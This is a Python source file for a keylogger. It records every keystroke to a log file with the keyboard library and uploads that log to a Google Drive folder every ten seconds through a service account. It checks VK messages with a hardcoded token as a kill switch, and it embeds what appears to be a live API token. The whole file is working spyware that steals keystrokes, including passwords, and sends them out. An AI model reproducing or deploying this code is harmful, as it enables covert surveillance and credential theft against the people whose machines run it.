from threading import Thread
import logging
import keyboard
from google.oauth2 import service_account
from googleapiclient.http import MediaFileUpload
from googleapiclient.discovery import build
import time
from random import randint
from vk_api import VkApi
import sys


def save_key(event):
    logging.info(str(event))


def logger():
    logging.basicConfig(filename='latest.log', filemode='a', format='[%(asctime)s]: %(message)s', level=logging.INFO)
    logging.info('__log start__')
    keyboard.hook(save_key)
    keyboard.wait()


def loader():
    scopes = ['https://www.googleapis.com/auth/drive']
    service_account_file = 'keylogger-282819-7c70753b5a94.json'
    credentials = service_account.Credentials.from_service_account_file(service_account_file, scopes=scopes)
    service = build('drive', 'v3', credentials=credentials)
    last_id = 0
    while True:
        folder_id = '1KrHbzTNzYN__XogOqaeUeDo0nkxWqkcN'
        name = 'latest.log'
        file_path = 'latest.log'
        file_metadata = {
            'name': name,
            'parents': [folder_id]
        }
        media = MediaFileUpload(file_path, resumable=True)
        r = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        if last_id != 0:
            service.files().delete(fileId=last_id).execute()
        last_id = r['id']
        time.sleep(10)


vk = VkApi(token='ea8292bcd9e05e8ad29d2b75883902b6bdd3eb3327d41a05244055fb637a7237755342f1f4b904a26dce0')
messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unread"})
while messages["count"] >= 1:
    user_id = messages["items"][0]["last_message"]["from_id"]
    mes = messages["items"][0]["last_message"]["text"]
    if user_id != 487376437:
        vk.method("messages.markAsRead", {"peer_id": user_id, "random_id": randint(0, 10000)})
        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unread"})
    else:
        sys.exit("found message")
thread_logger = Thread(target=logger)
thread_loader = Thread(target=loader)
thread_logger.start()
thread_loader.start()
